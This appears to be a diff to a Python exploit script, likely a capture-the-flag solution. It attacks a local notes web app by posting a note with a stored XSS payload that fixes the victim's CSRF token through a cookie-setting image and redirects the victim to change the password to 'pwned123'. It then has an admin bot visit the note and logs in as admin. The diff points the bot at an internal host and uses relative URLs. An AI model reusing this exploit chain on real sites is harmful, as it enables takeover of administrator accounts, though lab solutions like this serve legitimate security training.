@@ -2,6 +2,7 @@ import requests, sys, re, time, os
 
 APP = "http://localhost:7777"
 BOT = os.environ.get("BOT_URL", "http://localhost:8888")
+INTERNAL = os.environ.get("INTERNAL_APP", "http://app:5000")
 
 U = "pwner1337"
 P = "hunter2"
@@ -15,21 +16,21 @@ def main():
     c = s.cookies.get("csrf_token")
     print("csrf:", c)
 
-    e = f"""<img src="{APP}/cookie/set?name=csrf_token&value={c}">
+    e = f"""<img src="/cookie/set?name=csrf_token&value={c}">
 <script>
 setTimeout(function() {{
-  window.location = "{APP}/change-password?password=pwned123&csrf_token={c}";
+  window.location = "/change-password?password=pwned123&csrf_token={c}";
 }}, 1500);
 </script>"""
 
     s.post(APP + "/create", data={"title": "check this out", "content": e})
     m = re.search(r'/notes/(\d+)', s.get(APP + "/dashboard").text)
     nid = m.group(1)
-    u = f"{APP}/notes/{nid}"
+    u = f"{INTERNAL}/notes/{nid}"
     print("exploit:", u)
 
     requests.post(BOT + "/report", data={"url": u})
-    time.sleep(5)
+    time.sleep(10)
 
     s2 = requests.Session()
     r = s2.post(APP + "/login", data={"username": "admin", "password": "pwned123"})
